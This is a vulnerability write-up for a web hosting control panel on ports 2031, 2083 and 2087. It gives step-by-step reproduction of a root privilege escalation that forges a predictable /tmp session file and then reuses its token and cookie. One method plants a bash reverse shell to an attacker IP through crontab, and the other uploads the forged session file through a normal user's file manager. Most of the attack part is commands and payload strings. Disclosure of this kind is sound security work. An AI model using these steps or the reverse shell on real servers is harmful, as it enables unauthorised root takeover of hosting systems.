# ====================================================================
# Root course of the vulnerability
# ====================================================================
1. The session file are store at /tmp directory
2. rkey value in the session file dose not change when access by the same source IP address



# ====================================================================
# Steps to Reproduce
# ====================================================================

Session prepareation state
    1. Check the current IP address of attacker
    2. Set the IP address on testing environment network
    3. Login as root on port 2031/2087 and save the cookie name from web browser (cwsrp-xxxxxxxxxxxxxxxxxxxxx)
    4. Copy the content of session file (/tmp/sess_xxxxxxxxxxxxxx) to a new file "sess_123456"                  # we need "rkey"
    5. Save the token value from the session file (cwp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx)

    * rkey is created from client ip, then do not change client ip when attack the real target

Attack state

    #
    #   Method 1 Uploading via reverse shell
    #

    1. Go to crontab and set "bash -i >& /dev/tcp/[Attacker-IP]/8000 0>&1"
    2. Create session file through reverse shell

        echo "username|s:4:\"root\";logged|b:1;rkey|s:20:\"[RKEY]\";token|s:36:\"[TOKEN-KEY]\";" > /tmp/sess_123456

    3. On another browser, replace the token value in the URL https://[target.com]:2031/cwp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/admin/index.php
    4. Change file permission "chmod 664 /tmp/sess_123456"
    5. Create cookie name "cwsrp-xxxxxxxxxxxxxxxxxxxxx" and set its value to "123456" (sess_123456)
    6. Open the URL and become the root user


    #
    # Method 2 Uploading via File manager function
    #

    1. On the real target, login as a normal user on port 2083 and upload file "sess_123456" to /tmp directory and set permission to 644 (chmod 664 /tmp/sess_123456) via crontab feature
    2. On another browser, replace the token value in the URL https://[target.com]:2031/cwp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/admin/index.php
    3. Create cookie name "cwsrp-xxxxxxxxxxxxxxxxxxxxx" and set its value to "123456" (sess_123456)
    4. Open the URL and become the root user

    *From step 1 - 4 need doing it quickly. if we do it too slow, the application will change the permission of file sess_123456 to 600, and the file will become 0 byte. If this happened, attacker need to change session file name and repeat the steps again
